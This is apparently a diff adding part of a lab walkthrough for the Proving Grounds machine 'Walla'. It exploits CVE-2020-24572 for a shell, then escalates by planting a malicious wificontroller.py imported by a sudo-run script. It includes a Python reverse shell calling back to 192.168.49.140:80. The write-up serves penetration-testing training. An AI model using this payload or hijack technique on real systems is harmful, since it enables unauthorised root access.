@@ -62,3 +62,39 @@ In the about page, we know that the version is `2.5`.
 
 There is a remote command execution vulnerability [CVE-2020-24572](https://github.com/gerbsec/CVE-2020-24572-POC) can use to obtain an interactive shell.
 
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Walla/Walla_2021.07.10_19h04m45s_001_.png)
+
+Get the local.txt.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Walla/Walla_2021.07.10_19h05m42s_002_.png)
+
+#### Privilege Escalation
+
+Use command `sudo -l` to list available permissions.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Walla/Walla_2021.07.10_19h22m05s_003_.png)
+
+Notice the `wifi_reset.py` import the `wificontroller.py`. 
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Walla/Walla_2021.07.10_19h22m39s_004_.png)
+
+We can set up a `wificontroller.py` file, which contains the reverse shell content, to make `wifi_reset.py` call.
+
+```
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.140\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'")
+except:
+        print 'ERROR...'
+sys.exit(0)
+```
+
+After create `wificontroller.py` file in the `/home/walter` folder. Execute the command `sudo /usr/bin/python /home/walter/wifi_reset.py`.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Walla/Walla_2021.07.10_20h03m18s_005_.png)
+
+Get a shell back with root permisson.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Walla/Walla_2021.07.10_20h03m58s_006_.png)
